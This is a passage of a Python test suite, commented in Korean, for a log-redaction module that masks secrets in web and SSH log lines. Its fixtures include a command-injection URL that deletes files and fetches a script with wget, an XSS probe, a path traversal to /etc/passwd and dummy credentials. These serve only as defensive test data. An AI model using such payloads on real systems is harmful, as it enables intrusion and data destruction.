"""보호 대상 장비 최근 로그(node_logs.py · 이슈 #73) 시험. DB 없이 돈다.  python3 -m unittest discover -s app

보는 것
  1. 가림: 계약서 2.2 예시 전부(표) · 검토 지적 입력(표: 쿼리 키 속 비밀 · 경로 뒤 조각 · 대문자와 모르는 인증 스킴 ·
     이스케이프 JSON · %3A · 스킴 없는 사용자 정보 · 닫히지 않은 따옴표 · 비밀이 아닌 키 뒤의 비밀 키) · 멱등 · None ·
     username 에서 가린 값은 message 의 같은 자리에서도 가려짐 · 모든 문자열 칸의 비밀(hunter2 · JWT · 16진 32 · Bearer · Basic ·
     사용자 정보 · 표준 base64 · 검토 지적 입력 · 512자에서 잘린 JSON)이 응답 글자에 없음 · 비밀 키 낱말 조각이 비밀 키를 모두 덮음 ·
     성능(적대 입력 24종을 칸별 자르기 길이로 200행씩, 각 0.5초 미만. 옛 식(이차 시간)은 이 시험에서 떨어짐)
  2. 줄 질의 문장: password 는 IS NOT NULL 로만 쓰이고 input · session · shasum 은 고르지 않음. 이벤트 이름은 늘 허용 목록
  3. 보호 대상 판정(web-01 · 카드 id 만) · 이 장비 탐지(실제 규칙 파일: w2 · c1 · sg1, 가장 오래된 값, 16분 멈춤, 실행 없음) ·
     receipt 해석(사전 아님 · 글자 아님 · 틀린 ISO · 시간대 없음 · _other · 선언 밖 · 상태가 ok 가 아님)
  4. 라우터: 세션 없으면 401(풀 · 계정 조회 0) · 422(kind · src_ip · status · limit, 풀 호출 0, src_ip 는 한국어 한 문장) ·
     404(형식 밖 id 는 풀 호출 0, 관측 센서 · 관제 시스템 · 모르는 id 는 같은 문장) · viewer 200 · 트랜잭션 하나 · 질의 9개 이하 ·
     시각 고정 자릿수 · 줄 id(32자 16진, 같은 줄 같은 id, line_hash 는 응답에 없음) · (ts, id) 내림차순
  5. 사건 상세(main.get_incident ② 행위 · ④ 원문): 보호 대상 장비(web-01 · 카드) 줄만 목록과 같은 가림, 허니팟 · 디코이 · 관문 ·
     콘솔 · 감사 · 수집 관문 줄은 원문 그대로(같은 사건에 섞인 경우). 칸 · 순서 · has_password 는 그대로, 카드는 관련 장비 계산이
     읽은 것을 써 nodes 질의가 늘지 않음. 한계: 카드가 없는 노드(발생원 겹침 · nodes 를 읽을 수 없음)의 줄은 가리지 않음.
     ① 근거 표본(요청 경로 서명 사건 R107 · sg1): 보호 대상 표본만 같은 가림이고 ④ 의 같은 요청과 같은 값, 디코이 · 발생원 없는
     표본 · 표본 밖 칸은 그대로, 응답 어디에도 보호 대상 줄의 비밀이 없음. 모양이 다른 근거 · 표본(글자 · 발생원 목록 · 글자가
     아닌 값)에서 500 이 나지 않음
main 이 필요한 시험은 test_web 을 먼저 불러 asyncpg 가 없는 곳에서도 가짜를 넣는다(main 보다 먼저).
"""
import ast
import asyncio
import hashlib
import json
import re
import time
import unittest
from contextlib import asynccontextmanager
from datetime import datetime, timedelta, timezone
from pathlib import Path
from unittest.mock import patch

from fastapi import HTTPException
from fastapi.testclient import TestClient

import node_logs as nl
import targets as t

ROOT = Path(__file__).resolve().parents[1]
NOW = datetime(2026, 9, 28, 3, 0, tzinfo=timezone.utc)
M = nl.MASK

FP = "uNiVztksCsDhcc0u9e8BujQXVUpKZIDTMczCvj3tD2s"          # SSH 키 지문(SHA256 base64 43자)
JWT = ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0."
       "dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U")
HEX32 = "5f4dcc3b5aa765d61d8327deb882cf99"
HEX_USER = "9f86d081884c7d659a2feaa0c55ad015"
B64 = "k/9Qz+Ab3/Zt8wPq1Lm4Nx7Rv2Sy5Tu6Wx0Yz3Ab5Cd8E="          # 표준 base64('/' 포함)
MOZILLA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 "
           "Safari/537.36")

# 계약서 2.2 의 입력 → 출력(번호가 같다). 칸: url · ua · message · username
EXAMPLES = [
    (1, "url", "/search?q=1&b=2", "/search?q=…&b=…"),
    (2, "url", "/login?user=admin&password=hunter2", "/login?user=…&password=…"),
    (3, "url", f"/api/items?access_token={JWT}", "/api/items?access_token=…"),
    (4, "url", "/?debug", "/?…"),
    (4, "url", "/?XDEBUG_SESSION_START", "/?…"),
    (4, "url", "/?hunter2", "/?…"),
    (5, "url", "/?<script>alert(1)</script>", "/?…"),
    (6, "url", f"/reset/{HEX32}", f"/reset/{M}"),
    (7, "url", f"/reset/{HEX32[:31]}", f"/reset/{HEX32[:31]}"),
    (8, "url", "/files/123e4567-e89b-12d3-a456-426614174000", "/files/123e4567-e89b-12d3-a456-426614174000"),
    (9, "url", "/assets/index-4f3a2b1c.js", "/assets/index-4f3a2b1c.js"),
    (9, "url", "/wp-content/plugins/contact-form-7/readme.txt", "/wp-content/plugins/contact-form-7/readme.txt"),
    (9, "url", "/.env", "/.env"),
    (10, "url", "/.git/objects/ab/cdef0123456789abcdef0123456789abcdef01", f"/.git/objects/ab/{M}"),
    (11, "url", "/login;jsessionid=A1B2C3D4E5", f"/login;jsessionid={M}"),
    (12, "url", "http://admin:s3cret@10.0.0.1/", f"http://{M}@10.0.0.1/"),
    (12, "url", "http://admin:p@ss@10.0.0.1/", f"http://{M}@10.0.0.1/"),
    (13, "url", "/a?x=1#token=zzz", "/a?x=…#…"),
    (14, "url", "/p/Top-10-Kubernetes-Operators-Explained-2024", "/p/Top-10-Kubernetes-Operators-Explained-2024"),
    (15, "url", "/dl/QmFzZTY0VG9rZW5TYW1wbGVfdmFsdWUxMjM0NTY3ODkw", f"/dl/{M}"),
    (16, "url", "/eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.sig123", f"/{M}"),
    (17, "url", "/?%ADd+allow_url_include%3d1", "/?…"),
    (17, "url", "/shell?cd+/tmp;rm+-rf+*;wget+http://198.51.100.9/x.sh", "/shell?…"),
    (18, "url", "/%70assword=abc", "/%70assword=abc"),
    (19, "url", "/login?next=/admin&token=", "/login?next=…&token="),
    (20, "ua", MOZILLA, MOZILLA),
    (20, "ua", "curl/8.5.0", "curl/8.5.0"),
    (21, "ua", "Authorization: Bearer abcDEF123456", f"Authorization: {M}"),
    (22, "ua", "x Bearer abcDEF123456 y", f"x Bearer {M} y"),
    (22, "ua", "x Basic dXNlcjpwYXNz y", f"x Basic {M} y"),
    (23, "ua", "Visual Basic 6.0", f"Visual Basic {M}"),
    (24, "ua", "sqlmap token=abc123; session=xyz", f"sqlmap token={M}; session={M}"),
    (25, "ua", "python-requests/2.31.0 token:ghp_1A2b3C4d5E6f7G8h9I0jKlMnOpQrStUvWxYz12",
     f"python-requests/2.31.0 token:{M}"),
    (26, "ua", "api_key%3Dxyz123", f"api_key%3D{M}"),
    (27, "ua", "author=kim", "author=kim"),
    (27, "ua", "compass: north", "compass: north"),
    (27, "ua", "pwd", "pwd"),
    (27, "ua", "monkey=1", "monkey=1"),
    (28, "ua", "user=admin&pw=1234", f"user=admin&pw={M}"),
    (28, "ua", "PHPSESSID=abcdef", f"PHPSESSID={M}"),
    (28, "ua", "X-Auth: foo", f"X-Auth: {M}"),
    (28, "ua", "key=AIzaSyA1b2", f"key={M}"),
    (28, "ua", "Cookie: a=b", f"Cookie: {M}"),
    (29, "ua", 'probe {"password":"p@ss w0rd"}', f'probe {{"password":{M}}}'),
    (30, "ua", "pass\u200bword=secret", "pass\u200bword=secret"),
    (31, "ua", f"x {B64} y", f"x {M} y"),
    (32, "ua", f"SHA256:{FP}", f"SHA256:{M}"),
    (32, "username", f"SHA256:{FP}", f"SHA256:{M}"),
    (33, "message", "Failed password for root from 203.0.113.9 port 51234 ssh2",
     "Failed password for root from 203.0.113.9 port 51234 ssh2"),
    (34, "message", f"Accepted publickey for ops from 192.168.50.10 port 50022 ssh2: ED25519 SHA256:{FP}",
     f"Accepted publickey for ops from 192.168.50.10 port 50022 ssh2: ED25519 SHA256:{FP}"),
    (35, "message", f"Invalid user {HEX_USER} from 203.0.113.9 port 2222", f"Invalid user {M} from 203.0.113.9 port 2222"),
    (35, "username", HEX_USER, M),
    (36, "message", f"Invalid user SHA256:{FP} from 203.0.113.9 port 2222",
     f"Invalid user SHA256:{M} from 203.0.113.9 port 2222"),
    (37, "username", "P@ssw0rd!", "P@ssw0rd!"),
]

# 검토 지적(2026-09-30)의 입력 → 출력. (지적, 칸, 입력, 출력)
REVIEW_EXAMPLES = [
    # 쿼리 키가 키 모양(QUERY_KEY)이 아니거나 토큰 모양이면 조각 전체를 가린다
    ("쿼리 키", "url", "/api?a=1&password%3Dhunter2%26x=1", "/api?a=…&…"),
    ("쿼리 키", "url", '/api?{"password":"hunter2","sig":"a=="}', "/api?…"),
    ("쿼리 키", "url", "/api?user:admin,password:hunter2,mode=1", "/api?…"),
    ("쿼리 키", "url", "/login?password%3Dhunter2=1", "/login?…"),
    ("쿼리 키", "url", "/r?http://admin:hunter2@10.0.0.1/=1", "/r?…"),
    ("쿼리 키", "url", "/r?token:abcdefgh1234=1", "/r?…"),
    ("쿼리 키", "url", f"/?ids%5B%5D=1&a[b]=2&{HEX32}=1&=1", "/?ids%5B%5D=…&a[b]=…&…&…"),
    # 경로 속 비밀 값은 '/' 에서 멈추고 뒤따르는 경로(경로 이동 흔적)는 남긴다
    ("경로 뒤", "url", "/foo;jsessionid=abc/../../manager/html", f"/foo;jsessionid={M}/../../manager/html"),
    ("경로 뒤", "url", "/app/token:x/../../etc/passwd", f"/app/token:{M}/../../etc/passwd"),
    ("경로 뒤", "url", "/api/key:list/users/1", f"/api/key:{M}/users/1"),
    ("경로 뒤", "url", "/app;jsessionid=ABC123/index.jsp?x=1", f"/app;jsessionid={M}/index.jsp?x=…"),
    # 인증 스킴은 대소문자를 가리지 않고, authorization 키는 모르는 스킴도 값과 함께 가린다
    ("인증 스킴", "ua", "Authorization: TOKEN abc123secret", f"Authorization: {M}"),
    ("인증 스킴", "ua", "Authorization: DIGEST abc123secret", f"Authorization: {M}"),
    ("인증 스킴", "ua", "Authorization: ApiKey s3cr3tKeyValue", f"Authorization: {M}"),
    ("인증 스킴", "message", "Proxy-Authorization: Negotiate YIIabcDEF123", f"Proxy-Authorization: {M}"),
    ("인증 스킴", "ua", "X-Auth-Token: TOKEN abc123", f"X-Auth-Token: {M}"),
    ("인증 스킴", "ua", "curl/8 Authorization: TOKEN ghp_Ab12Cd34", f"curl/8 Authorization: {M}"),
    ("인증 스킴", "ua", "token: abc def", f"token: {M} def"),      # 모르는 스킴은 authorization 키만
    # 이스케이프한 JSON(\") · 값 속 이스케이프 따옴표
    ("이스케이프", "ua", '{\\"password\\":\\"hunter2\\"}', f'{{\\"password\\":{M}}}'),
    ("이스케이프", "message", 'data {\\"token\\": \\"abcDEF\\"}', f'data {{\\"token\\": {M}}}'),
    ("이스케이프", "ua", '{"password":"a\\"b c"}', f'{{"password":{M}}}'),
    # 퍼센트로 쓴 ':'(%3A) 도 구분자다
    ("%3A", "ua", "token%3Ahunter2", f"token%3A{M}"),
    ("%3A", "url", "/x/password%3Ahunter2", f"/x/password%3A{M}"),
    ("%3A", "message", "session%3aabc123", f"session%3a{M}"),
    # 스킴 없는 사용자 정보(//이름:비밀번호@)
    ("사용자 정보", "url", "//admin:hunter2@evil.example/x", f"//{M}@evil.example/x"),
    ("사용자 정보", "url", "/redirect//admin:hunter2@evil.example", f"/redirect//{M}@evil.example"),
    ("사용자 정보", "ua", "x https://example.com:8080/a@b", "x https://example.com:8080/a@b"),
    # 닫는 따옴표가 없으면 끝까지 가린다
    ("닫히지 않은 따옴표", "ua", "probe password='hunter2", f"probe password={M}"),
    ("닫히지 않은 따옴표", "ua", 'probe password="hunter2', f"probe password={M}"),
    ("닫히지 않은 따옴표", "message", 'x token="abc123secret', f"x token={M}"),
    ("닫히지 않은 따옴표", "username", 'secret="abc123', f"secret={M}"),
    # 비밀이 아닌 키의 값 안에 든 비밀 키도 본다
    ("값 속 키", "ua", "user=token=abc", f"user=token={M}"),
    ("값 속 키", "ua", "a:password=abc", f"a:password={M}"),
    ("값 속 키", "ua", "author=kim;pw=1", f"author=kim;pw={M}"),
]


def apply(field, value):
    if field == "url":
        return nl.mask_url(value)
    return nl.mask_text(value, fingerprint=field == "message")


# ----------------------------------------------------------------------
#  1. 가림
# ----------------------------------------------------------------------

class MaskTests(unittest.TestCase):
    def test_계약서_예시_전부(self):
        self.assertEqual({n for n, *_ in EXAMPLES}, set(range(1, 38)))
        for n, field, given, want in EXAMPLES:
            with self.subTest(n=n, field=field, given=given):
                got = apply(field, given)
                self.assertEqual(got, want)
                self.assertEqual(apply(field, got), got, "멱등")

    def test_검토_지적_입력(self):
        for finding, field, given, want in REVIEW_EXAMPLES:
            with self.subTest(finding=finding, field=field, given=given):
                got = apply(field, given)
                self.assertEqual(got, want)
                self.assertEqual(apply(field, got), got, "멱등")

    def test_비밀_키_낱말_조각은_비밀_키를_모두_덮는다(self):
        # 머리 식(PAIR)은 조각이 든 키만 보고, 조각이 없는 글자는 식을 돌리지 않는다. 비밀 키가 빠지면 가림이 빠진다
        for word in (*nl.SECRET_LONG, "pass", "pwd", "pw", "auth", "key", "sid"):
            with self.subTest(word=word):
                self.assertTrue(nl.secret_key(word))
                self.assertTrue(any(hint in word for hint in nl.HINTS))

    def test_None_은_None_이다(self):
        self.assertIsNone(nl.mask_url(None))
        self.assertIsNone(nl.mask_text(None))
        self.assertIsNone(nl.mask_text(None, fingerprint=True))
        self.assertEqual(nl.mask_row({k: None for k in nl.CLIP}), {k: None for k in nl.CLIP})

    def test_키_지문_예외는_message_끝만이다(self):
        tail = f"ssh2: ED25519 SHA256:{FP}"
        self.assertEqual(nl.mask_text(tail, fingerprint=True), tail)
        # 다른 칸 · 끝이 아닌 자리 · 지문 앞 글이 다른 것은 가린다
        self.assertEqual(nl.mask_text(tail), f"ssh2: ED25519 SHA256:{M}")
        self.assertEqual(nl.mask_text(f"{tail} more", fingerprint=True), f"ssh2: ED25519 SHA256:{M} more")
        self.assertEqual(nl.mask_text(f"key: ED25519 SHA256:{FP}", fingerprint=True), f"key: {M} SHA256:{M}")

    def test_username_에서_가린_값은_message_에서도_가려진다(self):
        for user in [HEX_USER, f"SHA256:{FP}", JWT, "pw=1234", "token:abc", B64, "Bearer abcDEF123", "Basic dXNlcjpwYXNz",
                     "http://a:b@h", "admin", "P@ssw0rd!"]:
            masked = nl.mask_text(user)
            for message in (f"Invalid user {user} from 203.0.113.9 port 2222",
                            f"Failed password for invalid user {user} from 203.0.113.9 port 2222 ssh2",
                            f"Accepted publickey for {user} from 203.0.113.9 port 2222 ssh2: ED25519 SHA256:{FP}"):
                with self.subTest(user=user, message=message):
                    # 이름 자리(첫 자리)만 바꿔 견준다. 끝의 키 지문은 이름과 같은 글자여도 남는다
                    got = nl.mask_text(message, fingerprint=True)
                    self.assertEqual(got, nl.mask_text(message.replace(user, masked, 1), fingerprint=True))
                    if masked != user:
                        self.assertNotIn(user, got.split(" from ")[0])

    def test_모든_문자열_칸의_비밀이_응답_글자에_없다(self):
        row = {"line_hash": "0" * 40, "ts": NOW, "eventid": "nginx.request", "src_ip": "203.0.113.7", "src_port": 1,
               "http_status": 200, "has_password": True,
               "http_method": "token=hunter2",
               "url": f"http://admin:s3cret@10.0.0.1/reset/{HEX32}?password=hunter2&t={JWT}#{B64}",
               "user_agent": f"Mozilla/5.0 Authorization: Bearer abcDEF123456 x Basic dXNlcjpwYXNz k {B64}",
               "username": f"pw=hunter2 {B64}",
               "message": f"Invalid user {HEX32} from 203.0.113.9 port 22 token=hunter2 {JWT} http://u:s3cret@h/"}
        text = json.dumps(nl.line_item(row, nl.line_id_key("시험 비밀")), ensure_ascii=False)
        for secret in ("hunter2", JWT, HEX32, "abcDEF123456", "dXNlcjpwYXNz", "s3cret", B64, "0" * 40):
            with self.subTest(secret=secret):
                self.assertNotIn(secret, text)
        self.assertIn(M, text)
        self.assertEqual(json.loads(text)["has_password"], True)
        self.assertNotIn("password", {k for k in json.loads(text)} - {"has_password"})

    def test_검토_지적_입력의_비밀이_응답_글자에_없다(self):
        base = {"line_hash": "0" * 40, "ts": NOW, "eventid": "nginx.request", "src_ip": "203.0.113.7", "src_port": 1,
                "http_status": 200, "has_password": False, "http_method": "GET", "url": "/", "user_agent": None,
                "username": None, "message": None}
        column = {"url": "url", "ua": "user_agent", "message": "message", "username": "username"}
        key = nl.line_id_key("시험 비밀")
        secrets = ("hunter2", "abc123", "s3cr3tKeyValue", "YIIabcDEF123", "abcDEF", "ghp_Ab12Cd34", "abcdefgh1234")
        for finding, field, given, _ in REVIEW_EXAMPLES:
            text = json.dumps(nl.line_item({**base, column[field]: given}, key), ensure_ascii=False)
            for secret in secrets:
                if secret in given:
                    with self.subTest(finding=finding, given=given, secret=secret):
                        self.assertNotIn(secret, text)
        # 적재 · 응답에서 512자로 잘려 닫는 따옴표가 없어진 JSON UA
        ua = "A" * 490 + ' {"password":"hunter2hunter2"}'
        item = nl.line_item({**base, "user_agent": ua}, key)
        self.assertTrue(item["user_agent"].endswith(f'{{"password":{M}'))
        self.assertNotIn("hunter2", json.dumps(item, ensure_ascii=False))

    def test_칸별_자르기_길이_안에서_가린다(self):
        row = {"http_method": "G" * 40, "url": "/" + "x" * 3000,     # 'a' 는 16진 글자라 모양으로 가려진다
               "user_agent": "u" * 900, "username": "n" * 300,
               "message": "m" * 700}
        self.assertEqual({k: len(v) for k, v in nl.mask_row(row).items()},
                         {"http_method": 16, "url": 2048, "user_agent": 512, "username": 256, "message": 512})


# 적대 입력 24종: (이름, 머리, 되풀이 단위). 값은 (머리 + 단위 × n)을 칸 길이로 자른 것이다. 뒤 5종은 검토 반영 때 더했다
#   (비밀 키마다 가림 · 비밀이 아닌 키 뒤 다시 찾기 · 스킴 없는 사용자 정보 · 이스케이프 JSON · 닫히지 않은 따옴표와 끝 역빗금)
ADVERSARIAL = [
    ("a.", "", "a."), ("eyJ-", "", "eyJ-"), ("Ab1-", "", "Ab1-"), ("Ab1/", "", "Ab1/"),
    ("a:// + ':'", "a://", ":"), ("a://x: + '@'", "a://x:", "@"), ("=", "", "="), ("@", "", "@"),
    ("a", "", "a"), ("0", "", "0"), ("Ab1", "", "Ab1"), ("password", "", "password"), ("a=", "", "a="),
    ("%3D", "", "%3D"), ("x*63 + '='", "", "x" * 63 + "="), ("bearer ", "", "bearer "), ('a:"', "", 'a:"'),
    ("eyJ 8자.", "", "eyJaaaaaaaa."), ("ssh2: ", "", "ssh2: ED25519 "),
    ("pw= ", "", "pw= "), ("author=", "", "author="), ("//a:", "", "//a:"), ('\\"pw\\":', "", '\\"pw\\":'),
    ('pw="\\', "", 'pw="\\'),
]
# 옛 식(시작점마다 끝까지 훑어 'a.' · 'eyJ-' 반복에서 이차 시간이 된다). 시험이 이것을 잡는지 본다
OLD_USERINFO = re.compile(r"(?i)\b([a-z][a-z0-9+.\-]*://)[^/@\s:]+:[^/@\s]+@")
OLD_JWT = re.compile(r"\beyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]*")
PERF_LIMIT = 0.5


def adversarial_rows(head, unit, count=200):
    def value(n):
        return (head + unit * (n // len(unit) + 1))[:n]
    return [{field: value(n) for field, n in nl.CLIP.items()} for _ in range(count)]


def mask_seconds(head, unit):
    """적대 행 200개를 가리는 데 걸린 초. url 은 경로 모양과 쿼리 모양('/?' + 값)을 모두 가린다."""
    rows = adversarial_rows(head, unit)
    started = time.perf_counter()
    for row in rows:
        nl.mask_row(row)
        nl.mask_url("/?" + row["url"])
    return time.perf_counter() - started


class MaskPerformanceTests(unittest.TestCase):
    def test_적대_입력_24종이_각각_0_5초_미만이다(self):
        self.assertEqual(len(ADVERSARIAL), 24)
        for name, head, unit in ADVERSARIAL:
            with self.subTest(kind=name):
                self.assertLess(mask_seconds(head, unit), PERF_LIMIT)

    def test_옛_식은_이_시험에서_떨어진다(self):
        with patch.object(nl, "USERINFO", OLD_USERINFO), patch.object(nl, "JWT", OLD_JWT):
            worst = max(mask_seconds(head, unit) for name, head, unit in ADVERSARIAL if name in ("a.", "eyJ-"))
        self.assertGreater(worst, PERF_LIMIT)


# ----------------------------------------------------------------------
#  2. 질의 문장
# ----------------------------------------------------------------------

class SqlTests(unittest.TestCase):
    def test_password_는_있었는지만_읽고_세션_입력_해시는_고르지_않는다(self):
        for sql in (nl.LINES_SQL, nl.FUTURE_SQL):
            with self.subTest(sql=sql[:40]):
                self.assertEqual(re.findall(r"\bpassword\b[^,\n]*", sql), [] if sql is nl.FUTURE_SQL
                                 else ["password IS NOT NULL AS has_password"])
                for column in ("input", "session", "shasum", "dst_port", "protocol", "duration_ms"):
                    self.assertIsNone(re.search(rf"\b{column}\b", sql), column)
        self.assertIn("e.sensor = $1 AND e.provenance = 'real'", nl.LINES_SQL)
        self.assertIn("e.eventid LIKE ANY($4::text[])", nl.LINES_SQL)
        self.assertIn("ORDER BY e.ts DESC, e.line_hash DESC", nl.LINES_SQL)

    def test_이벤트_이름은_늘_허용_목록이다(self):
        self.assertEqual(nl.patterns(None), ["nginx.%", "sshd.%"])
        self.assertEqual(nl.patterns("web"), ["nginx.%"])
        self.assertEqual(nl.patterns("ssh"), ["sshd.%"])
        self.assertEqual(nl.KIND_LABEL, {"web": "웹 접근", "ssh": "SSH 인증"})

    def test_필터_인자_번호는_이어진다(self):
        self.assertEqual(nl.filter_sql(5, None, None), ("", []))
        extra, params = nl.filter_sql(5, "203.0.113.7", 404)
        self.assertEqual((re.findall(r"\$[0-9]+", extra), params), (["$5", "$6"], ["203.0.113.7", 404]))
        extra, params = nl.filter_sql(4, None, 200)
        self.assertEqual((re.findall(r"\$[0-9]+", extra), params), (["$4"], [200]))

    def test_출발지_검사(self):
        self.assertIsNone(nl.parse_src_ip(None))
        self.assertIsNone(nl.parse_src_ip(""))
        self.assertEqual(nl.parse_src_ip(" 2001:DB8::1 "), "2001:db8::1")
        self.assertEqual(nl.parse_src_ip("203.0.113.7"), "203.0.113.7")
        for bad in ("abc", "fe80::1%eth0", "1.2.3.4\x00", " " * 60 + "1.2.3.4", "999.1.1.1"):
            with self.subTest(bad=bad), self.assertRaises(HTTPException) as caught:
                nl.parse_src_ip(bad)
            self.assertEqual((caught.exception.status_code, caught.exception.detail), (422, nl.BAD_SRC_IP))


# ----------------------------------------------------------------------
#  3. 보호 대상 · 탐지 · 수신 시각
# ----------------------------------------------------------------------

def node_row(node_id, status="active", hostname=None, sensor=None, reception="normal"):
    """targets.NODES_SQL 한 행과 같은 꼴."""
    return {"node_id": node_id, "hostname": hostname, "sensor": sensor, "status": status, "reception": reception,
            "last_seen_at": NOW - timedelta(minutes=2), "last_loaded_at": NOW - timedelta(minutes=2)}


CARDS = t.node_targets([node_row("web-02", hostname="web02.lab", sensor="web-02"),
                        node_row("web-03", sensor="web-02"),                           # 발생원이 겹침
                        node_row("probe-01", status="revoked", reception="revoked"),
                        node_row("web-04", status="pending", reception="waiting")])


def bridge_files() -> tuple:
    """1분 다리가 돌리는 규칙 파일(collector/pull_loki.py RULESETS)."""
    tree = ast.parse((ROOT / "collector" / "pull_loki.py").read_text())
    for node in tree.body:
        if isinstance(node, ast.Assign) and any(getattr(x, "id", None) == "RULESETS" for x in node.targets):
            return ast.literal_eval(node.value)
    raise AssertionError("RULESETS 가 없다")


def rule_rows(files):
    """규칙 파일 → ({버전: 허니팟인가}, RULES_SQL 행들)."""
    honeypot, rows = {}, []
    for name in files:
        doc = json.loads((ROOT / "detector" / name).read_text())
        honeypot[doc["rule_version"]] = all(re.match(r"^R0[0-9]{2}([^0-9]|$)", r["id"]) for r in doc["rules"])
        for rule in doc["rules"]:
            p = rule.get("params") or {}
            rows.append({"rule_version": doc["rule_version"], "rule_id": rule["id"], "type": rule.get("type"),
                         **{k: json.dumps(p[k]) if k in p else None for k in (
                             "sensors", "eventids", "eventid", "eventid_like", "http_status", "exclude_url_patterns",
                             "window_seconds", "threshold")}})
    return honeypot, rows


class DeviceTests(unittest.TestCase):
    def test_보호_대상은_web_01_과_카드_id_뿐이다(self):
        self.assertEqual([c["id"] for c in CARDS], ["web-02", "web-04"])
        self.assertEqual(nl.protected_device("web-01", CARDS), {"id": "web-01", "label": "web-01", "kind": "fixed"})
        self.assertEqual(nl.protected_device("web-02", CARDS), {"id": "web-02", "label": "web02.lab", "kind": "node"})
        self.assertEqual(nl.protected_device("web-04", CARDS)["kind"], "node")
        for other in ("aws-sensor", "console", "data-node", "web-03", "probe-01", "web-09", "_unconfirmed", ""):
            with self.subTest(device=other):
                self.assertIsNone(nl.protected_device(other, CARDS))
        # nodes 를 읽을 수 없으면(카드 없음) 등록 노드는 보호 대상으로 확인되지 않는다
        self.assertIsNone(nl.protected_device("web-02", []))
        self.assertEqual(nl.protected_device("web-01", [])["id"], "web-01")

    def test_장비_id_형식(self):
        for good in ("web-01", "a", "0", "a" * 63, "web-02-b"):
            self.assertTrue(nl.DEVICE_ID.fullmatch(good), good)
        for bad in ("WEB-01", "_unconfirmed", "a" * 64, "web\x00", "web-01\n", "-web", "", "web_01", "web.01"):
            self.assertIsNone(nl.DEVICE_ID.fullmatch(bad), bad)


class DetectTests(unittest.TestCase):
    def setUp(self):
        files = bridge_files()
        self.assertNotIn("rules_node.json", files)
        honeypot, self.bridge = rule_rows(files)
        self.assertFalse(any(honeypot.values()), "다리 규칙 파일에는 허니팟 버전이 없다")
        hp, _ = rule_rows(["rules_v3.json"])
        self.honeypot = {**honeypot, **hp}
        self.nodes = t.node_sources(CARDS)

    def paths(self, minutes: dict) -> list:
        return [{"rule_version": v, "last_at": NOW - timedelta(minutes=m), "honeypot": self.honeypot[v]}
                for v, m in sorted(minutes.items())]

    def test_이_장비의_버전은_w2_c1_sg1_이고_가장_오래된_값이다(self):
        paths = self.paths({"s1": 0.5, "w2": 1, "a1": 0.2, "i2": 0.1, "c1": 2, "sg1": 3, "v3": 0.05})
        for device in ("web-01", "web-02"):
            with self.subTest(device=device):
                got = nl.device_detect(paths, self.bridge, device, self.nodes, NOW)
                self.assertEqual([v["rule_version"] for v in got["versions"]], ["c1", "sg1", "w2"])
                self.assertEqual((got["last_at"], got["stale"], got["reason"]),
                                 ((NOW - timedelta(minutes=3)).isoformat(), False, None))
                self.assertEqual(set(got), {"last_at", "stale", "reason", "versions"})
        # 관측 센서 · 관제 시스템에는 이 경로가 아니다(이 함수는 보호 대상에만 쓰지만 판정이 장비별인지 본다)
        self.assertEqual([v["rule_version"] for v in nl.device_detect(paths, self.bridge, "data-node", self.nodes,
                                                                       NOW)["versions"]], ["s1"])

    def test_버전_하나가_16분_멈추면_멈춤이다(self):
        got = nl.device_detect(self.paths({"w2": 16, "c1": 1, "sg1": 2, "i2": 0.1}), self.bridge, "web-01", self.nodes,
                               NOW)
        self.assertEqual((got["stale"], got["reason"], got["last_at"]),
                         (True, "w2 마지막 실행 16분 전", (NOW - timedelta(minutes=16)).isoformat()))
        self.assertEqual([(v["rule_version"], v["stale"]) for v in got["versions"]],
                         [("c1", False), ("sg1", False), ("w2", True)])
        # 15분은 아직 멈춤이 아니다(targets.HEARTBEAT_STALE 넘게)
        got = nl.device_detect(self.paths({"w2": 15, "c1": 1, "sg1": 2}), self.bridge, "web-01", self.nodes, NOW)
        self.assertFalse(got["stale"])

    def test_실행이_없으면_null_이고_멈춤이다(self):
        for paths in ([], self.paths({"i2": 1, "v3": 1, "s1": 1})):
            got = nl.device_detect(paths, self.bridge, "web-01", self.nodes, NOW)
            self.assertEqual(got, {"last_at": None, "stale": True, "reason": "24시간 안 실행 기록 없음", "versions": []})


class ReceiptTests(unittest.TestCase):
    def node(self, logs, receipt):
        return {"logs": logs, "receipt": receipt, "last_loaded_at": NOW}

    def test_job_별_마지막_줄과_선언(self):
        receipt = json.dumps({"nginx": {"lines": 3, "last_line_at": "2026-09-28T02:59:30.120000+00:00"},
                              "auth": {"last_line_at": "2026-09-28T02:58:00+00:00"},
                              "metrics": {"last_line_at": "2026-09-28T02:59:59+00:00"},
                              "_other": {"last_line_at": "2026-09-28T02:59:59+00:00"}})
        got = nl.times_lines("ok", self.node(["nginx", "metrics"], receipt))
        self.assertEqual(got, [
            {"key": "web", "job": "nginx", "label": "웹 접근", "declared": True,
             "last_line_at": "2026-09-28T02:59:30.120000+00:00"},
            # 선언 밖이어도 받은 값은 그대로 싣는다(화면이 '수집 안 함' 으로 그린다)
            {"key": "ssh", "job": "auth", "label": "SSH 인증", "declared": False,
             "last_line_at": "2026-09-28T02:58:00+00:00"}])
        # jsonb 가 사전으로 와도 같다
        self.assertEqual(nl.times_lines("ok", self.node(["nginx", "metrics"], json.loads(receipt))), got)

    def test_모양이_틀린_receipt_는_null_이다(self):
        for receipt in ("[]", "{", "null", json.dumps({"nginx": "어제", "auth": ["x"]}),
                        json.dumps({"nginx": {"last_line_at": 123}, "auth": {"last_line_at": None}}),
                        json.dumps({"nginx": {"last_line_at": "어제"}, "auth": {"last_line_at": "2026-09-28T02:58:00"}}),
                        json.dumps({"_other": {"last_line_at": "2026-09-28T02:58:00+00:00"}})):
            with self.subTest(receipt=receipt):
                got = nl.times_lines("ok", self.node(["nginx", "auth"], receipt))
                self.assertEqual([(x["declared"], x["last_line_at"]) for x in got], [(True, None), (True, None)])

    def test_상태가_ok_가_아니면_선언도_시각도_null_이다(self):
        for state in ("unreadable", "no_node"):
            with self.subTest(state=state):
                self.assertEqual([(x["key"], x["declared"], x["last_line_at"]) for x in nl.times_lines(state, None)],
                                 [("web", None, None), ("ssh", None, None)])


class LineTests(unittest.TestCase):
    def row(self, line_hash, ts, eventid="nginx.request"):
